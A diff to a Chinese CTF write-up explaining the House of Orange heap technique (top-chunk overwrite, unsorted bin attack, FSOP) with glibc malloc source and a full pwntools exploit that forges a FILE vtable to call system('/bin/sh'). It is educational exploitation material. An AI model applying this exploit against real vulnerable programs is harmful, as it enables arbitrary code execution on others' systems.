@@ -24,40 +24,41 @@ House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏�
 
 我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的malloc调用会执行到 libc.so 的`_int_malloc`函数中，在`int_malloc`函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来`_int_malloc`函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支。
 
-	/*
-	Otherwise, relay to handle system-dependent cases
-	*/
-	else {
-	      void *p = sysmalloc(nb, av);
-	      if (p != NULL && __builtin_expect (perturb_byte, 0))
-	    alloc_perturb (p, bytes);
-	      return p;
-	}
-
+```c
+/*
+Otherwise, relay to handle system-dependent cases
+*/
+else {
+      void *p = sysmalloc(nb, av);
+      if (p != NULL && __builtin_expect (perturb_byte, 0))
+    alloc_perturb (p, bytes);
+      return p;
+}
+```
 此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。
 
+```c
+if (av == NULL
+      || ((unsigned long) (nb) >= (unsigned long) (mp_.mmap_threshold)
+          && (mp_.n_mmaps < mp_.n_mmaps_max)))
+/*这里进行判断，判断分配的大小是否大于mmap分配的阀值，如果大于就是用mmap从新分配一个堆块，否则就会扩展top chunk*/
+    {
+    char *mm;           /* return value from mmap call*/
+    try_mmap:
+    .......
 
-	if (av == NULL
-	      || ((unsigned long) (nb) >= (unsigned long) (mp_.mmap_threshold)
-	          && (mp_.n_mmaps < mp_.n_mmaps_max)))
-	/*这里进行判断，判断分配的大小是否大于mmap分配的阀值，如果大于就是用mmap从新分配一个堆块，否则就会扩展top chunk*/
-	    {
-	    char *mm;           /* return value from mmap call*/
-	    try_mmap:
-	    .......
+    }
 
-	    }
+.......
+brk = snd_brk = (char *) (MORECORE_FAILURE);
+assert ((old_top == initial_top (av) && old_size == 0) ||
+          ((unsigned long) (old_size) >= MINSIZE &&
+           prev_inuse (old_top) &&
+           ((unsigned long) old_end & (pagesize - 1)) == 0));
 
-	.......
-    brk = snd_brk = (char *) (MORECORE_FAILURE);
-	assert ((old_top == initial_top (av) && old_size == 0) ||
-	          ((unsigned long) (old_size) >= MINSIZE &&
-	           prev_inuse (old_top) &&
-	           ((unsigned long) old_end & (pagesize - 1)) == 0));
-	
-	/* Precondition: not enough current space to satisfy nb request */
-	assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
-
+/* Precondition: not enough current space to satisfy nb request */
+assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
+```
 综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于`mmp_.mmap_threshold`,使得top chunk以brk形式扩展。
 
 后续检查`old_top_size`要求.
@@ -92,31 +93,86 @@ FSOP 的核心思想就是劫持`_IO_list_all` 的值来伪造链表和其中的
 
 我们的目标是触发`_IO_OVERFLOW`，下面是`_IO_flush_all_lockp`的源代码：
 
+```c
+int
+_IO_flush_all_lockp (int do_lock)
+{
+  int result = 0;
+  struct _IO_FILE *fp;
+  int last_stamp;
 
-![](/img/pic/house_of_orange/1.jpg)
+#ifdef _IO_MTSAFE_IO
+  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
+  if (do_lock)
+    _IO_lock_lock (list_all_lock);
+#endif
 
+  last_stamp = _IO_list_all_stamp;
+  fp = (_IO_FILE *) _IO_list_all;
+  while (fp != NULL)
+    {
+      run_fp = fp;
+      if (do_lock)
+	_IO_flockfile (fp);
+
+      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
+#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
+	   || (_IO_vtable_offset (fp) == 0
+	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
+				    > fp->_wide_data->_IO_write_base))
+#endif
+	   )
+	  && _IO_OVERFLOW (fp, EOF) == EOF)
+	result = EOF;
+
+      if (do_lock)
+	_IO_funlockfile (fp);
+      run_fp = NULL;
+
+      if (last_stamp != _IO_list_all_stamp)
+	{
+	  /* Something was added to the list.  Start all over again.  */
+	  fp = (_IO_FILE *) _IO_list_all;
+	  last_stamp = _IO_list_all_stamp;
+	}
+      else
+	fp = fp->_chain;
+    }
+
+#ifdef _IO_MTSAFE_IO
+  if (do_lock)
+    _IO_lock_unlock (list_all_lock);
+  __libc_cleanup_region_end (0);
+#endif
+
+  return result;
+}
+```
 可以看出当`_IO_FILE`结构满足下面的条件：最外层（）里面的判断结果为ture时`（）&&_IO_OVERFLOW (fp, EOF)`才会被调用（&&有短路功能），转而通过`fp = fp->_chain`寻找新的`_IO_file`结构来使用。
 
+```c
+（
+	(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
 
-	（
-		(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
-
-	       || (_IO_vtable_offset (fp) == 0
-	           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
-	                    > fp->_wide_data->_IO_write_base)
-	                     
-	                    ）
-	       
+       || (_IO_vtable_offset (fp) == 0
+           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
+                    > fp->_wide_data->_IO_write_base)
+                     
+                    ）
+```	       
 所以伪造的file结构体要通过的条件
 
-	1.((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
+```c
+1.((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
+```
 	   
-	或者是
+或者是
 	
-	2._IO_vtable_offset (fp) == 0 
-	&& fp->_mode > 0 
-	&& (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
-
+```c
+2._IO_vtable_offset (fp) == 0 
+&& fp->_mode > 0 
+&& (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
+```
 一般来说第一种比较好伪造,我的exp也是基于第一种构造的。
 
 
@@ -134,25 +190,221 @@ FSOP 的核心思想就是劫持`_IO_list_all` 的值来伪造链表和其中的
 
 nb为传入的分配size大小参数。
 
-![](/img/pic/house_of_orange/15.jpg)
+```c
+if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
+{
+  idx = fastbin_index (nb);
+  mfastbinptr *fb = &fastbin (av, idx);
+  mchunkptr pp = *fb;
+  do
+    {
+      victim = pp;
+      if (victim == NULL)
+        break;
+    }
+  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
+         != victim);
+  if (victim != 0)
+    {
+      if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
+        {
+          errstr = "malloc(): memory corruption (fast)";
+        errout:
+          malloc_printerr (check_action, errstr, chunk2mem (victim), av);
+          return NULL;
+        }
+      check_remalloced_chunk (av, victim, nb);
+      void *p = chunk2mem (victim);
+      alloc_perturb (p, bytes);
+      return p;
+    }
+}
+```
 
 如果所需的 chunk 大小小于等于 fast bins 中的最大 chunk 大小，首先尝试从 fast bins 中
 分配 chunk
 
-![](/img/pic/house_of_orange/16.jpg)
+```c
+if (in_smallbin_range (nb))
+    {
+      idx = smallbin_index (nb);
+      bin = bin_at (av, idx);
+
+      if ((victim = last (bin)) != bin)
+        {
+          if (victim == 0) /* initialization check */
+            malloc_consolidate (av);
+          else
+            {
+              bck = victim->bk;
+	if (__glibc_unlikely (bck->fd != victim))
+                {
+                  errstr = "malloc(): smallbin double linked list corrupted";
+                  goto errout;
+                }
+              set_inuse_bit_at_offset (victim, nb);
+              bin->bk = bck;
+              bck->fd = bin;
+
+              if (av != &main_arena)
+                victim->size |= NON_MAIN_ARENA;
+              check_malloced_chunk (av, victim, nb);
+              void *p = chunk2mem (victim);
+              alloc_perturb (p, bytes);
+              return p;
+            }
+        }
+    }
+```
 
 如果分配的 chunk 属于 small bin，首先查找 chunk 所对应 small bins 数组的 index，然后
 根据 index 获得某个 small bin 的空闲 chunk 双向循环链表表头，然后将最后一个 chunk 赋值
 给 victim，如果 victim 与表头相同，表示该链表为空，不能从 small bin 的空闲 chunk 链表中
 分配，这里不处理，等后面的步骤来处理。
 
-![](/img/pic/house_of_orange/18.jpg)
+```c
+else
+{
+  idx = largebin_index (nb);
+  if (have_fastchunks (av))
+    malloc_consolidate (av);
+}
+```
 
 所需 chunk 不属于 small bins，那么就一定属于 large bins，首先根据 chunk 的大小获得
 对应的 large bin 的 index，接着判断当前分配区的 fast bins 中是否包含 chunk，如果存在，调用 malloc_consolidate()函数合并 fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin
 中。
 
-![](/img/pic/house_of_orange/17.jpg)
+```c
+while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
+{
+  bck = victim->bk;
+  if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
+      || __builtin_expect (victim->size > av->system_mem, 0))
+    malloc_printerr (check_action, "malloc(): memory corruption",
+                     chunk2mem (victim), av);
+  size = chunksize (victim);
+
+  /*
+     If a small request, try to use last remainder if it is the
+     only chunk in unsorted bin.  This helps promote locality for
+     runs of consecutive small requests. This is the only
+     exception to best-fit, and applies only when there is
+     no exact fit for a small chunk.
+   */
+
+  if (in_smallbin_range (nb) &&
+      bck == unsorted_chunks (av) &&
+      victim == av->last_remainder &&
+      (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
+    {
+      /* split and reattach remainder */
+      remainder_size = size - nb;
+      remainder = chunk_at_offset (victim, nb);
+      unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
+      av->last_remainder = remainder;
+      remainder->bk = remainder->fd = unsorted_chunks (av);
+      if (!in_smallbin_range (remainder_size))
+        {
+          remainder->fd_nextsize = NULL;
+          remainder->bk_nextsize = NULL;
+        }
+
+      set_head (victim, nb | PREV_INUSE |
+                (av != &main_arena ? NON_MAIN_ARENA : 0));
+      set_head (remainder, remainder_size | PREV_INUSE);
+      set_foot (remainder, remainder_size);
+
+      check_malloced_chunk (av, victim, nb);
+      void *p = chunk2mem (victim);
+      alloc_perturb (p, bytes);
+      return p;
+    }
+
+  /* remove from unsorted list */
+  unsorted_chunks (av)->bk = bck;
+  bck->fd = unsorted_chunks (av);
+
+  /* Take now instead of binning if exact fit */
+
+  if (size == nb)
+    {
+      set_inuse_bit_at_offset (victim, size);
+      if (av != &main_arena)
+        victim->size |= NON_MAIN_ARENA;
+      check_malloced_chunk (av, victim, nb);
+      void *p = chunk2mem (victim);
+      alloc_perturb (p, bytes);
+      return p;
+    }
+
+  /* place chunk in bin */
+
+  if (in_smallbin_range (size))
+    {
+      victim_index = smallbin_index (size);
+      bck = bin_at (av, victim_index);
+      fwd = bck->fd;
+    }
+  else
+    {
+      victim_index = largebin_index (size);
+      bck = bin_at (av, victim_index);
+      fwd = bck->fd;
+
+      /* maintain large bins in sorted order */
+      if (fwd != bck)
+        {
+          /* Or with inuse bit to speed comparisons */
+          size |= PREV_INUSE;
+          /* if smaller than smallest, bypass loop below */
+          assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
+          if ((unsigned long) (size) < (unsigned long) (bck->bk->size))
+            {
+              fwd = bck;
+              bck = bck->bk;
+
+              victim->fd_nextsize = fwd->fd;
+              victim->bk_nextsize = fwd->fd->bk_nextsize;
+              fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
+            }
+          else
+            {
+              assert ((fwd->size & NON_MAIN_ARENA) == 0);
+              while ((unsigned long) size < fwd->size)
+                {
+                  fwd = fwd->fd_nextsize;
+                  assert ((fwd->size & NON_MAIN_ARENA) == 0);
+                }
+
+              if ((unsigned long) size == (unsigned long) fwd->size)
+                /* Always insert in the second position.  */
+                fwd = fwd->fd;
+              else
+                {
+                  victim->fd_nextsize = fwd;
+                  victim->bk_nextsize = fwd->bk_nextsize;
+                  fwd->bk_nextsize = victim;
+                  victim->bk_nextsize->fd_nextsize = victim;
+                }
+              bck = fwd->bk;
+            }
+        }
+      else
+        victim->fd_nextsize = victim->bk_nextsize = victim;
+    }
+
+  mark_bin (av, victim_index);
+  victim->bk = bck;
+  victim->fd = fwd;
+  fwd->bk = victim;
+  bck->fd = victim;
+
+#define MAX_ITERS       10000
+  if (++iters >= MAX_ITERS)
+    break;
+}
+```
 
 * 走到了这一步，也就是从 `fast bins` , `small bins` , `large bins`的链表中均没有找到合适的chunk，反向遍历 `unsorted bin` 的双向循环链表中的`unsorted bin chunk`,并检查当前遍历的 chunk 是否合法，不合法则抛出`malloc_printerr` 
 *  如果需要分配一个 `small bin chunk`，在上面的 `small bins` 中没有匹配到合适的chunk，并且 `unsorted bin` 中只有一个 chunk，并且这个 chunk 为 `last remainder chunk`，并且这个 chunk 的大小大于所需 chunk 的大小加上 `MINSIZE`，在满足这些条件的情况下，用这个chunk切分出需要的`small bin chunk`,将内存指针返回给应用层，退出`_int_malloc()`。这是唯一的从`unsorted bin`中分配`small bin chunk`的情况
@@ -196,16 +448,17 @@ nb为传入的分配size大小参数。
 
 经分析，题目中创建了两种数据结构orange与house
 
-	struct orange{
-	  int price ;
-	  int color ;
-	};
-	 
-	struct house {
-	  struct orange *org;
-	  char *name ;
-	};
-
+```c
+struct orange{
+  int price ;
+  int color ;
+};
+ 
+struct house {
+  struct orange *org;
+  char *name ;
+};
+```
 题目中共分为4种操作
 
 * build house  :
@@ -245,16 +498,19 @@ nb为传入的分配size大小参数。
 创建一个house，upgrade它覆盖topchunk，覆盖`top chunk`的 size为`0xf31`,为什么是`0xf31` ? 
 我们可以计算，build一个house，我们先分配了 `0x20` 的chunk，然后接着为name分配了 `0x90` 大小的chunk，最后为price，colour又分配了 `0x20` 的chunk，我们一共占用的heap空间为 `0x20+0x90+0x20=0xd0`,再加上top chunk的大小也就是整个main_arena分配的heap大小 必须要页对齐（4kb=0x1000），用`0x1000-0xd0=0xf30` size 的 prev inuse 位必须为 1,所以最终确定构造的size为`0xf31`
 
-	build(0x80,'AAAA',1,1)
-	upgrade(0x100,'B'*0x80+p64(0)+p64(0x21)+p32(0)+p32(0)+2*p64(0)+p64(0xf31),2,2)
-
+```python
+build(0x80,'AAAA',1,1)
+upgrade(0x100,'B'*0x80+p64(0)+p64(0x21)+p32(0)+p32(0)+2*p64(0)+p64(0xf31),2,2)
+```
 upgrade后的heap chunks如下图：
 
 ![](/img/pic/house_of_orange/11.jpg)
 
 然后如果我们再分配一个不大于mmap分配阈值(默认为 128K)的chunk，让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 `unsorted bin` 中。
 
-	build(0x1000,'CCCC',3,3)
+```python
+build(0x1000,'CCCC',3,3)
+```
 
 执行完后，bins 如图所示：
 
@@ -272,7 +528,9 @@ upgrade后的heap chunks如下图：
 
 当我们再次build一个house，且该house的name大小为`large bin`时，我们就能分配到一个可同时泄露`main_arena`地址和`heap`地址的chunk.
 
-	build(0x400,'D'*8,4,4)
+```python
+build(0x400,'D'*8,4,4)
+```
 
 下面是分配的name的chunk图：
 
@@ -288,23 +546,26 @@ upgrade后的heap chunks如下图：
 
 泄露libc地址，进而得到`system`，`_IO_list_all`地址
 
-	see()
-	io.recvuntil('Name of house : DDDDDDDD')
-	libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c2760-0x668
-	system_addr = libc_base+libc.symbols['system']
-	log.info('system_addr:'+hex(system_addr))
-	IO_list_all = libc_base+libc.symbols['_IO_list_all']
-	log.info('_IO_list_all:'+hex(IO_list_all))
+```python
+see()
+io.recvuntil('Name of house : DDDDDDDD')
+libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c2760-0x668
+system_addr = libc_base+libc.symbols['system']
+log.info('system_addr:'+hex(system_addr))
+IO_list_all = libc_base+libc.symbols['_IO_list_all']
+log.info('_IO_list_all:'+hex(IO_list_all))
+```
 
 泄露heap地址
 
-	upgrade(0x400,'E'*0x10,5,5)
-	see()
-	io.recvuntil('Name of house : ')
-	io.recvuntil('E'*0x10)
-	heap_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x130
-	log.info('heap_base:'+hex(heap_base))
-
+```python
+upgrade(0x400,'E'*0x10,5,5)
+see()
+io.recvuntil('Name of house : ')
+io.recvuntil('E'*0x10)
+heap_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x130
+log.info('heap_base:'+hex(heap_base))
+```
 ###### 3.UnsortedBin attack 与 FSOP
 
 UnsortedBin Attack的原理见我的[Unsorted Bin Attack 笔记](https://sirhc.xyz/2018/09/06/Unsorted-Bin-Attack-%E7%AC%94%E8%AE%B0/)
@@ -315,28 +576,29 @@ UnsortedBin Attack的原理见我的[Unsorted Bin Attack 笔记](https://sirhc.x
 
 由于无法控制`main_arena`中的内容，所以我们决定使用指向`next IOFILE`对象的链指针,上面提到了`_IO_flush_all_lockp` 将会利用`_chain`选择下一个`_IO_file`，`_chain`的地址恰好是smallbin[4]的地址，所以我们通过upgrade修改Unsorted Bin的大小为0x61，再次malloc时，UnsortedBin中的chunk从链表中卸下来。smallbin[4]即`_chain`中就填入了heap内容,代码如下：
 
-	vtable_addr = heap_base +0x140
-	
-	pad =p64(0)*3+p64(system_addr)  # vtable
-	pad = pad.ljust(0x410,"\x00")
-	pad += p32(6)+p32(6)+p64(0)
-	
-	stream = "/bin/sh\x00"+p64(0x61)
-	stream += p64(0xddaa)+p64(IO_list_all-0x10)
-	stream +=p64(1)+p64(2)     # fp->_IO_write_ptr > fp->_IO_write_base
-	stream = stream.ljust(0xc0,"\x00")
-	stream += p64(0)    # mode<=0
-	stream += p64(0)
-	stream += p64(0)
-	stream += p64(vtable_addr)
-	
-	payload = pad + stream
-	
-	upgrade(0x800,payload,6,3)
+```python
+vtable_addr = heap_base +0x140
 
-	io.recvuntil('Your choice : ')
-	io.sendline(str(1))
+pad =p64(0)*3+p64(system_addr)  # vtable
+pad = pad.ljust(0x410,"\x00")
+pad += p32(6)+p32(6)+p64(0)
 
+stream = "/bin/sh\x00"+p64(0x61)
+stream += p64(0xddaa)+p64(IO_list_all-0x10)
+stream +=p64(1)+p64(2)     # fp->_IO_write_ptr > fp->_IO_write_base
+stream = stream.ljust(0xc0,"\x00")
+stream += p64(0)    # mode<=0
+stream += p64(0)
+stream += p64(0)
+stream += p64(vtable_addr)
+
+payload = pad + stream
+
+upgrade(0x800,payload,6,3)
+
+io.recvuntil('Your choice : ')
+io.sendline(str(1))
+```
 构造完payload -> bulid ->  `UnsortedBin attack`成功执行后，我们看看`_IO_list_all`指向的`main arena+0x58`下的`_chain`:
 
 ![](/img/pic/house_of_orange/20.jpg)
@@ -353,14 +615,15 @@ UnsortedBin Attack的原理见我的[Unsorted Bin Attack 笔记](https://sirhc.x
 
 该攻击有一定概率失败，主要原因是因为第一次将`_IO_list_all`劫持到`main_arena`时，由于`main_arena`不可控，该内存随机
 
-	     if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)   
-	   || (_IO_vtable_offset (fp) == 0                                    
-	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr             
-				    > fp->_wide_data->_IO_write_base))                          
-	   )                                                                  
-	  && _IO_OVERFLOW (fp, EOF) == EOF)                                   
-	result = EOF;                                                         
-
+```c
+     if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)   
+   || (_IO_vtable_offset (fp) == 0                                    
+       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr             
+			    > fp->_wide_data->_IO_write_base))                          
+   )                                                                  
+  && _IO_OVERFLOW (fp, EOF) == EOF)                                   
+result = EOF;                                                         
+```
 
   `&& _IO_OVERFLOW (fp, EOF) == EOF`的符号`&&`为**短路与**，所以有时该check流程，假如`((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)`判断为真，或者是
 `_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)`判断为真,那他们相或结果为真，就会造成执行
@@ -370,93 +633,94 @@ UnsortedBin Attack的原理见我的[Unsorted Bin Attack 笔记](https://sirhc.x
 
 #### EXP
 
-	from pwn import *
-	#context(os='linux', arch='amd64', log_level='debug')
-	
-	io = process('./orange')
-	elf = ELF('./orange')
-	libc = ELF('/lib/x86_64-linux-gnu/libc-2.19.so')
-	
-	def build(Length,Name,Price,Choice):
-	    io.recvuntil('Your choice : ')
-	    io.sendline(str(1))
-	    io.recvuntil('name :')
-	    io.sendline(str(Length))
-	    io.recvuntil('Name :')
-	    io.send(Name)
-	    io.recvuntil('Orange:')
-	    io.sendline(str(Price))
-	    io.recvuntil('Color of Orange:')
-	    io.sendline(str(Choice))
-	
-	def see():
-	    io.recvuntil('Your choice : ')
-	    io.sendline(str(2))
-	
-	def upgrade(Length,Name,Price,Choice):
-	    io.recvuntil('Your choice : ')
-	    io.sendline(str(3))
-	    io.recvuntil('name :')
-	    io.sendline(str(Length))
-	    io.recvuntil('Name:')
-	    io.send(Name)
-	    io.recvuntil('Orange: ')
-	    io.sendline(str(Price))
-	    io.recvuntil('Color of Orange: ')
-	    io.sendline(str(Choice))
-	
-	#OverWrite TopChunk
-	build(0x80,'AAAA',1,1)
-	upgrade(0x100,'B'*0x80+p64(0)+p64(0x21)+p32(0)+p32(0)+2*p64(0)+p64(0xf31),2,2)
-	
-	#TopChunk->unsorted bin
-	build(0x1000,'CCCC',3,3)
-	
-	#leak libc_base 
-	build(0x400,'D'*8,4,4)
-	see()
-	io.recvuntil('Name of house : DDDDDDDD')
-	libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c2760-0x668
-	system_addr = libc_base+libc.symbols['system']
-	log.info('system_addr:'+hex(system_addr))
-	IO_list_all = libc_base+libc.symbols['_IO_list_all']
-	log.info('_IO_list_all:'+hex(IO_list_all))
-	
-	#leak heap_base
-	upgrade(0x400,'E'*0x10,5,5)
-	see()
-	io.recvuntil('Name of house : ')
-	io.recvuntil('E'*0x10)
-	heap_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x130
-	log.info('heap_base:'+hex(heap_base))
-	
-	
-	# unsortedbin attack ,Fsop
-	
-	vtable_addr = heap_base +0x140
-	
-	pad =p64(0)*3+p64(system_addr) # vtable
-	pad = pad.ljust(0x410,"\x00")
-	pad += p32(6)+p32(6)+p64(0)
-	
-	stream = "/bin/sh\x00"+p64(0x61)
-	stream += p64(0xddaa)+p64(IO_list_all-0x10)
-	stream +=p64(1)+p64(2) # fp->_IO_write_ptr > fp->_IO_write_base
-	stream = stream.ljust(0xc0,"\x00")
-	stream += p64(0) # mode<=0
-	stream += p64(0)
-	stream += p64(0)
-	stream += p64(vtable_addr)
-	
-	payload = pad + stream
-	
-	upgrade(0x800,payload,6,3)
-	
-	io.recvuntil('Your choice : ')
-	io.sendline(str(1))
-	
-	io.interactive()
+```python
+from pwn import *
+#context(os='linux', arch='amd64', log_level='debug')
 
+io = process('./orange')
+elf = ELF('./orange')
+libc = ELF('/lib/x86_64-linux-gnu/libc-2.19.so')
+
+def build(Length,Name,Price,Choice):
+    io.recvuntil('Your choice : ')
+    io.sendline(str(1))
+    io.recvuntil('name :')
+    io.sendline(str(Length))
+    io.recvuntil('Name :')
+    io.send(Name)
+    io.recvuntil('Orange:')
+    io.sendline(str(Price))
+    io.recvuntil('Color of Orange:')
+    io.sendline(str(Choice))
+
+def see():
+    io.recvuntil('Your choice : ')
+    io.sendline(str(2))
+
+def upgrade(Length,Name,Price,Choice):
+    io.recvuntil('Your choice : ')
+    io.sendline(str(3))
+    io.recvuntil('name :')
+    io.sendline(str(Length))
+    io.recvuntil('Name:')
+    io.send(Name)
+    io.recvuntil('Orange: ')
+    io.sendline(str(Price))
+    io.recvuntil('Color of Orange: ')
+    io.sendline(str(Choice))
+
+#OverWrite TopChunk
+build(0x80,'AAAA',1,1)
+upgrade(0x100,'B'*0x80+p64(0)+p64(0x21)+p32(0)+p32(0)+2*p64(0)+p64(0xf31),2,2)
+
+#TopChunk->unsorted bin
+build(0x1000,'CCCC',3,3)
+
+#leak libc_base 
+build(0x400,'D'*8,4,4)
+see()
+io.recvuntil('Name of house : DDDDDDDD')
+libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c2760-0x668
+system_addr = libc_base+libc.symbols['system']
+log.info('system_addr:'+hex(system_addr))
+IO_list_all = libc_base+libc.symbols['_IO_list_all']
+log.info('_IO_list_all:'+hex(IO_list_all))
+
+#leak heap_base
+upgrade(0x400,'E'*0x10,5,5)
+see()
+io.recvuntil('Name of house : ')
+io.recvuntil('E'*0x10)
+heap_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x130
+log.info('heap_base:'+hex(heap_base))
+
+
+# unsortedbin attack ,Fsop
+
+vtable_addr = heap_base +0x140
+
+pad =p64(0)*3+p64(system_addr) # vtable
+pad = pad.ljust(0x410,"\x00")
+pad += p32(6)+p32(6)+p64(0)
+
+stream = "/bin/sh\x00"+p64(0x61)
+stream += p64(0xddaa)+p64(IO_list_all-0x10)
+stream +=p64(1)+p64(2) # fp->_IO_write_ptr > fp->_IO_write_base
+stream = stream.ljust(0xc0,"\x00")
+stream += p64(0) # mode<=0
+stream += p64(0)
+stream += p64(0)
+stream += p64(vtable_addr)
+
+payload = pad + stream
+
+upgrade(0x800,payload,6,3)
+
+io.recvuntil('Your choice : ')
+io.sendline(str(1))
+
+io.interactive()
+```
 执行结果看下图：
 
 ![](/img/pic/house_of_orange/23.jpg)
